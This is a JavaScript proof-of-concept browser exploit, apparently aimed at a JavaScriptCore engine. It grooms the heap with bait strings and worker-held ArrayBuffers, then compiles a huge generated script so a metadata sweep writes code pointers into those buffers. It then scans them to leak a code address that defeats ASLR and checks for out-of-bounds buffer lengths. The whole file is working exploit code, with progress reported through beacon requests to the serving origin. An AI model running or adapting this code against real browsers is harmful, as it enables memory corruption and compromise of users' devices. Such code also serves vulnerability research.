// p379 - ArrayBuffer ASLR leak via MetadataTable sweep
//
// V377 CONFIRMED: String charCodeAt sees only 'A' data. Cannot leak addresses
// through string operations. BUT: the sweep writes thunk bytes (8-byte code
// pointer) into marge pages at entry+24 within each 112-byte stride.
//
// Strategy: Worker allocates ArrayBuffers BEFORE compile. Backing stores are
// in marge at HIGHER addresses (bait-and-switch). After compile, the sweep
// writes directly into the backing store data. Worker reads via Uint8Array.
//
// Sweep pattern per 112-byte entry:
//   +12: 0xFFFFFFFF (m_slowPathCount, 4 bytes) -- SIGNATURE
//   +24: THUNK (m_slowPathCallDestination, 8 bytes) -- ASLR LEAK
//   +64: bit fields (4 bytes, small value)
//   +68: bytecodeIndex (4 bytes, sequential)
//   All other offsets: NOT written (zeros from fastCalloc)
//
// Scan: find 0xFFFFFFFF signature, read 8 bytes at +12 from it = thunk.
//
// Beacon prefix: V379-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V379-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V379-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var workerCode = function() {
    var buffers = [];
    var views = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V379-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // Allocate 14 ArrayBuffers of 200KB each
        // Backing stores go into marge (fastCalloc, zero-initialized)
        for (var i = 0; i < 14; i++) {
          try {
            var ab = new ArrayBuffer(200000);
            var view = new Uint8Array(ab);
            buffers.push(ab);
            views.push(view);
          } catch(ex) {
            beacon('ALLOC-FAIL-' + i);
          }
        }
        beacon('BUFS-' + buffers.length);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // Phase 1: Quick check - are backing stores still accessible?
        // Also check for corrupted m_length (OOB capability if != 200000)
        var accessible = 0;
        var oobViews = [];
        for (var i = 0; i < views.length; i++) {
          try {
            var v = views[i];
            var len = v.length;
            if (len !== 200000) {
              beacon('B' + i + '-LEN-' + len);
              if (len > 200000) oobViews.push(i);
            }
            var b0 = v[0];
            accessible++;
          } catch(ex) {
            beacon('ACC-FAIL-' + i);
          }
        }
        beacon('ACC-' + accessible);
        if (oobViews.length > 0) beacon('OOB-VIEWS-' + oobViews.join(','));

        // Phase 2: Scan each backing store for 0xFFFFFFFF signature
        var leakCount = 0;
        for (var i = 0; i < views.length; i++) {
          try {
            var v = views[i];
            var len = v.length;
            var foundSig = false;

            // Count non-zero bytes in first 224 bytes (2 entries)
            var nonZero = 0;
            for (var j = 0; j < Math.min(len, 224); j++) {
              if (v[j] !== 0) nonZero++;
            }
            beacon('B' + i + '-nz' + nonZero);

            // Scan for 0xFF 0xFF 0xFF 0xFF signature
            for (var j = 0; j < len - 120; j++) {
              if (v[j] === 0xFF && v[j+1] === 0xFF && v[j+2] === 0xFF && v[j+3] === 0xFF) {
                foundSig = true;
                beacon('B' + i + '-SIG-' + j);

                // Read thunk at signature + 12 (entry+24 is 12 bytes after entry+12)
                var thunkHex = '';
                for (var k = j + 12; k < j + 20 && k < len; k++) {
                  thunkHex += hexByte(v[k]);
                }
                beacon('B' + i + '-THUNK-' + thunkHex);

                // Read the full 112-byte entry pattern starting from sig-12
                var entryStart = j - 0; // sig is at entry+12, so entry starts at j-12
                // But we start from the sig itself for simplicity
                // Read 32 bytes around the sig for context
                var ctx = '';
                var ctxStart = Math.max(0, j - 4);
                for (var k = ctxStart; k < ctxStart + 40 && k < len; k++) {
                  ctx += hexByte(v[k]);
                }
                beacon('B' + i + '-CTX-off' + ctxStart + '-' + ctx);

                // Verify: check next entry at sig+112
                if (j + 112 + 20 < len) {
                  var match = (v[j+112] === 0xFF && v[j+113] === 0xFF &&
                               v[j+114] === 0xFF && v[j+115] === 0xFF);
                  beacon('B' + i + '-NEXT-' + (match ? 'OK' : 'MISS'));

                  if (match) {
                    // Read thunk from next entry too
                    var thunk2 = '';
                    for (var k = j + 112 + 12; k < j + 112 + 20; k++) {
                      thunk2 += hexByte(v[k]);
                    }
                    beacon('B' + i + '-T2-' + thunk2);
                  }
                }

                // Read bytecodeIndex at sig+56 (entry+68 is 56 bytes after entry+12)
                if (j + 56 + 4 <= len) {
                  var bci = v[j+56] | (v[j+57] << 8) | (v[j+58] << 16) | (v[j+59] << 24);
                  beacon('B' + i + '-BCI-' + bci);
                }

                leakCount++;
                break; // Found in this buffer, move to next
              }
            }

            if (!foundSig) {
              // No signature found. Dump first 112 bytes for diagnosis
              var dump = '';
              for (var j = 0; j < Math.min(len, 112); j++) {
                dump += hexByte(v[j]);
              }
              // Split into 80-char chunks for beacon URL limit
              beacon('B' + i + '-NOSIG-' + dump.substring(0, 80));
              if (dump.length > 80) beacon('B' + i + '-NOSIG2-' + dump.substring(80, 160));
              if (dump.length > 160) beacon('B' + i + '-NOSIG3-' + dump.substring(160, 224));
            }
          } catch(ex) {
            beacon('B' + i + '-CRASH');
          }
        }

        beacon('LEAKS-' + leakCount);

        // Phase 3: If we got a thunk, extract full pointer and validate
        if (leakCount > 0) {
          beacon('EXTRACTING');
          for (var i = 0; i < views.length; i++) {
            try {
              var v = views[i];
              for (var j = 0; j < v.length - 120; j++) {
                if (v[j] === 0xFF && v[j+1] === 0xFF && v[j+2] === 0xFF && v[j+3] === 0xFF) {
                  // Full 8-byte thunk in little-endian
                  var lo = v[j+12] | (v[j+13] << 8) | (v[j+14] << 16) | (v[j+15] << 24);
                  var hi = v[j+16] | (v[j+17] << 8) | (v[j+18] << 16) | (v[j+19] << 24);
                  // Report as two 32-bit halves (JS doesn't have uint64)
                  beacon('PTR-B' + i + '-lo' + (lo >>> 0).toString(16) + '-hi' + (hi >>> 0).toString(16));
                  break;
                }
              }
            } catch(ex) {}
          }
        }

        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + baits.length);

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      for (var i = 0; i < baits.length; i++) baits[i] = null;
      baits = null;
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p379fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p379ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p379ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
